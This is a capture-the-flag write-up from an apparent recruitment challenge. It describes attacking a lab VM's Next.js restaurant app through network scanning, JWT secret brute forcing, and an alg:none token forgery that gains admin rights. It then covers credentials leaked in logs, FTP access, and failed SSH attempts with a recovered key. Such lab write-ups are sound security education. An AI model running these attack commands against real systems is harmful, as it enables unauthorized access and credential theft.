🏴‍☠️ **GDG CYBER RECRUITMENTS 2026**

# Task 2: Hidden Recipe

### Web Exploitation & Misconfiguration Analysis Report

---

## 📌 Challenge Overview

**Challenge Name:** Hidden Recipe
**Category:** Web Exploitation / JWT / Misconfiguration
**Target VM:** `gdg-workspace`
**Platform:** VirtualBox
**Network Mode:** Bridged
**Required Network:** Personal Mobile Hotspot
**Flag Format:** `gdg{...}`

**Objective:**
Identify security weaknesses in a restaurant’s internal web application and recover the hidden flag.

---

## 1️⃣ Environment Setup & Initial Access

### 1.1 Virtual Machine Deployment

* Imported the provided OVA file into VirtualBox
* VM booted successfully
* Network adapter configured in **Bridged Mode**
* VM obtained an IP address via DHCP

**Target IP identified:**

```
192.168.1.37
```

---

## 2️⃣ Network Enumeration

### 2.1 ARP Scan

To identify live hosts on the local network:

```bash
sudo netdiscover -r 192.168.0.0/16
```

**Relevant result:**

```
192.168.1.37  08:00:27:1e:cd:91  PCS Systemtechnik GmbH
```

**Conclusion:**

* Target is a VirtualBox VM
* Host is alive and reachable

---

## 3️⃣ Web Application Reconnaissance

### 3.1 Initial Web Access

Accessed the application via browser:

```
http://192.168.1.37
```

**Observations:**

* Modern web UI
* Login functionality present
* Authentication handled via cookies
* Response headers contained:

  * `next-router-state-tree`
  * `next-router-prefetch`

➡️ **Confirmed Next.js backend**

---

## 4️⃣ Authentication Analysis

### 4.1 JWT Discovery

After logging in as a normal user, an authentication cookie was issued:

```
token=<JWT>
```

**Decoded JWT:**

**Header**

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload**

```json
{
  "userId": 6,
  "admin": false,
  "iat": 1768502087,
  "exp": 1769106887
}
```

**Findings:**

* Role-based authorization using client-side `admin` boolean
* JWT stored in cookies
* Authorization fully dependent on JWT claims

---

## 5️⃣ JWT Attack Surface Enumeration

### 5.1 Signature Tampering Tests

| Attack                           | Result |
| -------------------------------- | ------ |
| Modified payload + old signature | ❌ 401  |
| Corrupted signature              | ❌ 401  |
| Expired token                    | ❌ 401  |
| Random token                     | ❌ 401  |

➡️ Signature validation appeared enforced under normal conditions.

### 5.2 JWT Secret Brute Force

```bash
python jwt_tool.py token.txt -C --dict rockyou.txt
```

**Result:**

```
[-] Key not in dictionary
```

➡️ JWT secret was strong / non-dictionary based.

---

## 6️⃣ Critical Vulnerability: `alg:none` JWT Bypass

### 6.1 Unsigned JWT Testing

```bash
python jwt_tool.py <token> -X a -np
```

**Result:**

```
Response Code: 200
```

🚨 **Critical vulnerability confirmed:**
The backend accepts unsigned JWTs (`alg: none`) when passed via cookies.

**Mapped Vulnerability:**

* **CWE-347:** Improper Verification of Cryptographic Signature
* **CVE-2015-9235** (JWT alg:none class of vulnerabilities)

### 6.2 Privilege Escalation

**Modified Header**

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

**Modified Payload**

```json
{
  "userId": 6,
  "admin": true
}
```

**Final Token Format**

```
base64(header).base64(payload).
```

### 6.3 Verification

```http
GET /api/me
Cookie: token=<unsigned-admin-token>
```

**Response:**

```json
{
  "user": {
    "id": 6,
    "email": "neeraj123@gmail.com",
    "admin": true
  }
}
```

✅ **Admin privileges successfully obtained**

---

## 7️⃣ Admin API Enumeration

### 7.1 Confirmed Admin Endpoint

```
/api/admin/orders
```

Returned:

* Orders of all users
* Internal business data

### 7.2 Logical Admin Endpoint Enumeration

```
/api/admin
/api/admin/users
/api/admin/logs
/api/admin/config
/api/admin/backup
/api/admin/db
/api/admin/env
/api/admin/flag
```

---

## 8️⃣ Sensitive Information Disclosure

### 8.1 `/api/admin/logs`

This endpoint exposed raw system and service logs.

**Credential Leak Identified:**

```
FTP login successful: user=backup
PASS oLd$bAcKuPsN@ThInGt@sEeHeRe
```

**Mapped Vulnerability:**

* **CWE-532:** Information Exposure Through Log Files
* **CWE-522:** Insufficiently Protected Credentials

---

## 9️⃣ FTP Access

### 9.1 Login

```bash
ftp 192.168.1.37
```

**Credentials:**

* Username: `backup`
* Password: `oLd$bAcKuPsN@ThInGt@sEeHeRe`

✅ Login successful

### 9.2 File Discovery

```bash
cd files
ls
```

Found:

```
intern_nightly_2024.1.zip
```

---

## 🔟 Credential Exposure via Backup

### 10.1 Extracted Contents

```
intern_backup/
├── README.txt
├── misc.txt
├── notes
└── ssh_old/
    ├── id_rsa
    └── id_rsa.pub
```

### 10.2 SSH Key Analysis

```bash
ssh-keygen -lf id_rsa
```

**Result:**

```
intern@gdg-workspace
```

**Conclusion:**

* SSH key belonged to a former intern
* Archived insecurely in backups
* Demonstrates poor credential lifecycle management

**Mapped Vulnerability:**

* **CWE-522:** Insufficiently Protected Credentials
* **CWE-912:** Hidden Functionality / Residual Artifacts

---

## 1️⃣1️⃣ SSH Authentication Attempts

Attempts using extracted artifacts:

```bash
ssh -i id_rsa backup@192.168.1.37
ssh -i id_rsa admin@192.168.1.37
ssh -i id_rsa deploy@192.168.1.37
```

And leaked passwords:

```bash
sshpass -p 'Markisarobot!' ssh deploy@192.168.1.37
```

**Result:**

```
Permission denied
```

---

## 1️⃣2️⃣ Why SSH Was a Dead End

* No valid publickey authentication observed
* SSH keys were historical artifacts
* Password-based SSH restricted to internal subnets
* Sessions auto-terminated
* No shell access achievable externally

➡️ SSH artifacts served as **evidence of misconfiguration**, not a valid exploitation path.

---

## 1️⃣3️⃣ Root Cause Analysis

### Identified Vulnerabilities & Standards Mapping

| Issue                   | CWE     | CVE / Class                  |
| ----------------------- | ------- | ---------------------------- |
| JWT alg:none accepted   | CWE-347 | CVE-2015-9235 (JWT alg:none) |
| Client-side admin trust | CWE-602 | JWT Design Flaw              |
| Sensitive logs exposed  | CWE-532 | N/A                          |
| Plaintext credentials   | CWE-522 | N/A                          |
| Insecure backups        | CWE-912 | N/A                          |

---

## 🏁 Final Status

✔ Admin access obtained
✔ Internal logs exposed
✔ FTP credentials recovered
✔ Sensitive backups extracted
❌ Flag not recovered

**Progress halted after application-layer and backup analysis, indicating the flag was likely intended to be retrieved from a frontend or specific admin API endpoint rather than OS-level access.**

---

## 🧠 Conclusion

This challenge demonstrated a realistic multi-stage security failure chain:

**JWT Misconfiguration → Privilege Escalation → Admin Access → Credential Leakage → Backup Exposure**

Even without full system compromise, the application suffered from severe design and operational security flaws that would be catastrophic in a real-world environment.
